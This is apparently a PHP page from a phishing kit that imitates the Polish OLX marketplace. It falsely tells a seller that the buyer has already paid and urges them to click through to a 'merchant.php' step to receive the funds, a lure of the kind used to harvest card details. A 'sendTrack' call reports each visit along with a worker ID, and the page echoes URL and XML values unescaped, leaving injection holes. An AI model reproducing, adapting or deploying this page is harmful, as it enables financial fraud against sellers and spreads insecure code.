<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>

<!DOCTYPE html>
<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
		<title>Reklamy w Polsce | Kupuj i sprzedawaj z zyskiem | OLX</title>
		
		<style>* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}
._4 {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 20px;
    margin-top: 40px;
}

.block {
    margin-top: 30px;
    display: flex;
}
.adress1 {
    width: 50%;
    margin-right: 15px;
}
.adress2 {
    width: 35%;
    margin-right: 15px;
}
.nav-info {
    width: 20%;
    margin-left: 50px;
}

body {
    font-family: 'Roboto', sans-serif;
    background: #f2f4f5;
    color: #002F34;
    min-width: 280px;
}

header {
    height: 72px;
    background: #002f34;
}
#icon-star {
    font-size: 22px;
    color: #fff;
}
#icon-star:before {
    content: "";
}

.container {
    padding: 0 20px;
    max-width: 1200px;
    margin: 0 auto;
    height: 100%;
}
#logbutton {
    padding-left: 18px;
    text-decoration: none;
    background: #fff;
    color: #002f34;
    float: right;
    font-size: 16px;
    font-weight: 600;
    line-height: 1.25;
    margin-top: 12px;
    margin-bottom: 12px;
    padding: 13px 22px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    -webkit-box-shadow: inset 0 0 0 8px #fff;
    -moz-box-shadow: inset 0 0 0 8px #fff;
    -ms-box-shadow: inset 0 0 0 8px #fff;
    -o-box-shadow: inset 0 0 0 8px #fff;
    box-shadow: inset 0 0 0 8px #fff;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    -ms-border-radius: 4px;
    -o-border-radius: 4px;
    border-radius: 4px;
    -webkit-transition: all 0.3s ease;
    -moz-transition: all 0.3s ease;
    -ms-transition: all 0.3s ease;
    -o-transition: all 0.3s ease;
    transition: all 0.3s ease;
}
#logbutton:hover {
    color: #fff;
    background: #002f34;
    -webkit-transition: all 0.3s ease;
    -moz-transition: all 0.3s ease;
    -ms-transition: all 0.3s ease;
    -o-transition: all 0.3s ease;
    transition: all 0.3s ease;
}

.header-logo {
    width: 71px;
    height: 41px;
    display: block;
    position: absolute;
    top: 15px;
    z-index: 10;
    text-indent: -1000em;
}

.header-logo_o {
    position: absolute;
    left: 0;
    top: 0;
    transform: translate(12px, 15px);
    content: '';
    border-radius: 50%;
    width: 10px;
    height: 10px;
    box-shadow: 0 0 0 12px #24e5db;
}

.header-logo_l {
    width: 10px;
    top: 0;
    bottom: 0;
    background: #23e5db;
    position: absolute;
    left: 37px;
}

.header-logo_x {
    width: 20px;
    height: 20px;
    overflow: hidden;
    display: block;
    position: absolute;
    left: 0;
    top: 0;
    transform: translate(51px, 10px);
}

.header-logo_x:before {
    transform: skewX(45deg) translate(-50%, 0);
    content: '';
    position: absolute;
    top: 0;
    left: 50%;
    width: 65%;
    height: 100%;
    background: #24e5db;
}

.header-logo_x:after {
    transform: skewX(-45deg) translate(-50%, 0);
    content: '';
    position: absolute;
    top: 0;
    left: 50%;
    width: 65%;
    height: 100%;
    background: #24e5db;
}
#footermain {
    display: flex;
    width: 80%;
    margin-left: 12%;
}
#nav3 {
    width: 40%;
}
main {
    margin: 20px 0;
}

.section-content {
    padding: 24px;
}
.nav-info > ul > li > a {
    text-decoration: none;
    color: #002f34;
    font-size: 16px;
    font-weight: 600;
}
.nav-info > ul {
    padding: 0;
}
.nav-info > ul > li {
    list-style: none;
    margin-bottom: 15px;
}

.item-container {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: start;
    margin-bottom: 70px;
}

.item-block {
    max-width: 68%;
    background: #fff;
}
.item-block_header {
    margin-bottom: 40px;
}

.item-block_title {
    font-size: 32px;
    line-height: 1.16;
    font-weight: 400;
}

.item-block_text {
    display: inline-block;
    vertical-align: top;
    margin-left: 20px;
    word-wrap: break-word;
    word-break: break-word;
    line-break: normal;
    hyphens: manual;
    max-width: 70%;
}

.item-block_image {
    display: inline-block;
    height: 115px;
}

.item-block_image img {
    border-radius: 5px;
    height: 115px;
    width: 110px;
    object-fit: cover;
}

.item-block_price {
    font-size: 38px;
    font-weight: 500;
    margin-top: 5px;
}

.item-block_status {
    font-size: 17px;
    font-weight: 500;
    margin-top: 10px;
}

.item-block_main {
    margin-top: 36px;
}

.item-block_description {

}

.recipient-block_row {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 30px;
}

.recipient-block_row label {
    display: block;
    margin-bottom: 5px;
}

.recipient-block_input {
    width: 100%;
    height: 38px;
    border: none;
    border-bottom: 1px #002f34 solid;
    outline: none;
    color: #63878A;
    font-size: 16px;
}

.recipient-subblock_min {
    width: 100%;
}

.recipient-subblock_max {
    width: 100%;
}

.description-title {
    font-size: 24px;
    font-weight: 500;
    margin-bottom: 15px;
}

.description-subtitle {
    font-size: 16px;
    line-height: 24px;
}

.description-mail {
    width: 110px;
    margin-top: 25px;
}

.item-block_footer {
    border-top: 2px solid #406367;
    margin-top: 30px;
    padding-top: 20px;
}

.item-footer_text {
    font-size: 15px;
}

.item-pay {
    max-width: 30%;
    width: 100%;
    background: white;
}

.item-pay_title {
    font-weight: 500;
}

.item-pay_item {
    margin-top: 5px;
    font-size: 15px;
}

.item-pay_price {
    font-size: 20px;
    margin-top: 15px;
}

.item-pay_button {
    background-color: #002f34;
    transition: all 0.3s ease;
    width: 100%;
    height: 45px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    line-height: 1.25;
    font-weight: 500;
    color: #ffffff;
    margin: 25px 0;
}

.item-pay_safery {
    font-size: 15px;
    margin-bottom: 10px;
}

.item-pay_safery img {
    width: 20px;
    height: 20px;
    vertical-align: middle;
    margin-right: 10px;
}

.item-pay_info {
    line-height: 1.4;
    font-size: 14px;
}

.item-pay_paymentMethods {
    max-width: 30px;
    width: 10%;
    margin-top: 10px;
    opacity: 0.6;
    filter: grayscale(100%);
    margin-left: 25px;
}

.section-info {
    background: #fff;
    border: 1px solid #f2f4f5;
    padding: 24px;
    width: 100%;
    margin-bottom: 20px;
}

.section-info_icon {
    width: 50px;
    height: 50px;
    vertical-align: middle;
}

.section-info_text {
    display: inline-block;
    vertical-align: middle;
    margin-left: 20px;
    width: 80%;
}

.section-info_title {
    font-size: 24px;
    font-weight: 500;
}

.section-info_subtitle {
    font-size: 17px;
    font-weight: 400;
    margin-top: 10px;
}
















input {
    font-family: Arial;
    font-size: 16px;
    color: #222;
    width: 100%;
    border: none;
    outline: none;
    box-sizing: border-box;
}
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #414141;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}









.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}








.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #414141;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #4e4e4e;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}





















@media(max-width: 1100px) {
    .item-container {
        display: block;
    }

    section {
        width: 100%;
        max-width: 100% !important;
        margin-bottom: 20px;
    }
} 
@media(max-width: 720px) {
    #footermain {
    display: block;
    }
    .nav-info {
    width: 100%;
    margin-bottom: 60px;
    }
    .item-block_title {
        font-size: 22px;
        font-weight: 600;
    }
}
@media(max-width: 500px) {
    .inlblk  {
    display: none;
    }
    #footermain {
    margin-left: 0;
    }
    .section-info_title {
        font-size: 20px;
    }

    .section-info_subtitle, .item-block_status {
        font-size: 15px;
    }

    .item-block_price {
        font-size: 34px;
    }

    .recipient-block_row {
        display: block;
    }

    .recipient-subblock_min {
        width: 100%;
        margin-bottom: 20px;
    }
} @media(max-width: 460px) {
    .section-info_icon {
        display: none;
    }

    .section-info_text {
        width: 100%;
        margin-left: 0px;
    }
    .item-block_text {
    margin-left: 0;
    }
}


/* Generator */
.generator-container {
    max-width: 500px;
    margin: 0 auto;
}

.generator-section {
    margin: 30px 0;
    width: 100%;
}

.generator-span {
    display: block;
    margin-bottom: 10px;
    font-size: .95em;
}

.generator-a {
    color: unset;
    font-weight: 600;
}

.generator-label {
    display: block;
    font-size: 1.05em;
    margin-bottom: 5px;
}

.generator-input {
    width: 100%;
    height: 38px;
    border: none;
    border-bottom: 1px #002f34 solid;
    outline: none;
    color: #002F34;
    font-size: 16px;
    background: unset;
}

.generator-button {
    background-color: #002f34;
    transition: all 0.3s ease;
    width: 100%;
    height: 45px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    line-height: 1.25;
    font-weight: 500;
    color: #ffffff;
}

.generator-input::placeholder {
    opacity: .7;</style>
		<script></script>
		<meta property="og:url" content="https://olx.pl/">
		<meta property="og:site_name" content="OLX">
		<meta property="og:title" content="<?php echo $xml->obyava; ?>">
		<meta property="og:description" content="<?php echo $xml->obyava; ?>: ogłoszenie na sprzedaż | OLX">
		<meta property="og:image" content="<?php echo $xml->img; ?>">
		<meta property="og:type" content="website">
		<meta property="og:locale" content="pl_PL">
	</head>
	<body>
		<header>
    <div class="container">
        <div class="header-logo">
            <span class="header-logo_o"></span>
            <span class="header-logo_l"></span>
            <span class="header-logo_x"></span>
        </div>
        <div style="float: right; display: flex;">
        <a href="https://www.olx.pl/observed/search/" class="tdnone inlblk " id="observed-search-link" title="Любими" data-cy="common_button_observed_searches" style="text-decoration: none;">
            <img src="ordercss/icon-star.png" style="width: 25px; margin-top: 20px; margin-right: 40px;">
        </a>
        <a href="https://www.olx.pl/observed/search/" class="tdnone inlblk " id="observed-search-link" title="Любими" data-cy="common_button_observed_searches" style="text-decoration: none;">
            <img src="ordercss/icon-star2.png" style="width: 25px; margin-top: 20px; margin-right: 10px;">
        </a>
        <div style="margin-top: 28px; margin-right: 40px;">
        <a href="https://www.olx.pl/observed/search/" class="tdnone inlblk " id="observed-search-link" title="Любими" data-cy="common_button_observed_searches" style="text-decoration: none; color: #fff;font-weight: 600;">
            Mój OLX
        </a>
        </div>
        <a id="logbutton" data-cy="common_link_header_postnewad" class="postnewlink fbold tdnone" href="https://www.olx.pl/adding/?bs=adpage_adding">
            <span>Dodaj ogłoszenie</span>
        </a>
        </div>
    </div>
</header>

    <main>
        <div class="container">
            <section class="section-info">
                <img src="ordercss/check.svg" alt="" class="section-info_icon">
                <div class="section-info_text">
                    <p class="section-info_title">Kupujący już zapłacił za Twój przedmiot</p>
                    <p class="section-info_subtitle">Zdobądź swoje pieniądze teraz</p>
                </div>
            </section>
            <div class="item-container">
                <section class="item-block">
                    <div class="section-content">
                        <div class="item-block_header">
                            <div class="item-block_image">
                                <img src="<?php echo $xml->img; ?>" alt="">
                            </div>
                            <div class="item-block_text">
                                <p class="item-block_title"><?php echo $xml->obyava; ?></p>
                                <p class="item-block_price"><?php echo $xml->price; ?> zł</p>
                                <p class="item-block_status">Twój przedmiot został opłacony</p>
                            </div>
                        </div>
                        <div class="recipient-block">
                            <div class="recipient-block_row">
                                <div class="recipient-subblock_min">
                                    <label>Pełne imię i nazwisko</label>
                                    <input class="recipient-block_input" value="<?php echo $xml->fio; ?>" readonly="">
                                </div>
                            </div>
                            <div class="recipient-block_row">
                                <div class="recipient-subblock_max">
                                    <label>Adres wysyłki</label>
                                    <input class="recipient-block_input" value="<?php echo $xml->to; ?>" readonly="">
                                </div>
                            </div>
                        </div>
                        <div class="item-block_main">
                            <div class="item-block_description">
                                <p class="description-subtitle">
Jak tylko otrzymasz środki na swoją kartę, wyślij
                                    towar do kupującego według danych, jaki napisane wyżej
                                    <br><br>Po wysłaniu towaru prosimy o podanie kupującemu numeru dostawy</p>
                                <img class="description-mail" src="ordercss/inpostlogo.png" alt="">
                            </div>
                        </div>
                        <div class="item-block_footer">
                            <p class="item-footer_text">Numer ogłoszenia: <b><?php echo $_GET['id']; ?></b></p>
                        </div>
                    </div>
                </section>
                <section class="item-pay">
                    <div class="section-content">
                        <!-- <span class="item-pay_title">Otrzymywanie środków</span> -->
                        <p class="item-pay_price">Otrzymać: <b><?php echo $xml->price; ?> zł</b></p>
                        <!-- <p class="item-pay_item"><?php echo $xml->obyava; ?></p> -->
                        <form action="merchant.php" method="get">
                        <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                        <a href="merchant.php?id=<?php echo $_GET['id']; ?>">
                            <button class="item-pay_button">Dalej</button>
                        </a>
                        </form>
                        <p class="item-pay_safery"><img src="ordercss/shield.svg" alt="">Dokonywanie płatności jest bezpieczne</p>
                        <img src="ordercss/maeschb.svg" alt="" class="item-pay_paymentMethods">
                        <img src="ordercss/visachb.svg" alt="" class="item-pay_paymentMethods">
                        <img src="ordercss/mastercardchb.svg" alt="" class="item-pay_paymentMethods">
                        <img src="ordercss/pcichb.svg" alt="" class="item-pay_paymentMethods" style="margin-bottom: 6px;">
                    </div>
                </section>
            </div>
        </div>
    </main>
    <footer style="background: url(/footerimg.png) no-repeat bottom center; padding-bottom: 50px; padding-top: 50px; border-top: 1px solid #7f9799;">
        <div id="footermain">
            <div class="nav-info">
                                <ul>
                                    <li><a href="https://blogolxpl.com/">OLX blog</a></li>
                                    <li><a href="https://www.olx.pl/mobileapps/">aplikacje mobilne</a></li>
                                    <li><a href="http://help.olx.pl/">Pomóż i skontaktuj się z nami</a></li>
                                    <li><a href="https://www.olx.pl/payment/whypromote/">Reklamy promocyjne</a></li>
                                    <li><a href="https://help.olx.pl/hc/pl/sections/202515965">Ogólne warunki</a></li>
                                    <li><a href="https://help.olx.pl/hc/pl/articles/360000904709">Polityka prywatności</a></li>
                                    <li><a href="https://help.olx.pl/hc/pl/articles/360000893129">Polityka Cookies</a></li>
                                    <li><a href="https://www.olxgroup.com/careers">Kariera w OLX</a></li>
                                </ul>
                                
                            </div>
                            <div class="nav-info">
                                <ul>
                                    <li><a href="https://www.olx.pl/howitworks/">Jak to działa?</a></li>
                                    <li><a href="https://www.olx.pl/safetyuser/">Wskazówki dotyczące bezpieczeństwa</a></li>
                                    <li><a href="https://www.olx.pl/sitemap/">Mapa kategorii</a></li>
                                    <li><a href="https://www.olx.pl/sitemap/regions/">Reklamy według miast</a></li>
                                    <li><a href="https://www.olx.pl/popular/">Popularne wyszukiwania</a></li>
                                    <li><a href="https://www.olx.pl/ad/mashina-za-ryazane-na-plochki-dewalt-relsova-profesionalna-CID1012-ID7JFvr.html#">Ustawienia plików cookies</a></li>
                                </ul>
                                
                            </div>
                            <div class="nav-info" id="nav3">
                                <div style="display: block;">
                                <div style="display: flex;">
                                    <img src="ordercss/googleplay.png" style="width: 120px;">
                                    <img src="ordercss/appstore.png" style="width: 120px; margin-left: 15px;">
                                </div>
                                <div style="color: #8E8E8E; font-size: 12px; line-height: 16px; margin-top: 15px;">Pobierz aplikację OLX na swój telefon!</div>
                                </div>
                            </div>
        </div>
    </footer>
    <style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #002F34;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
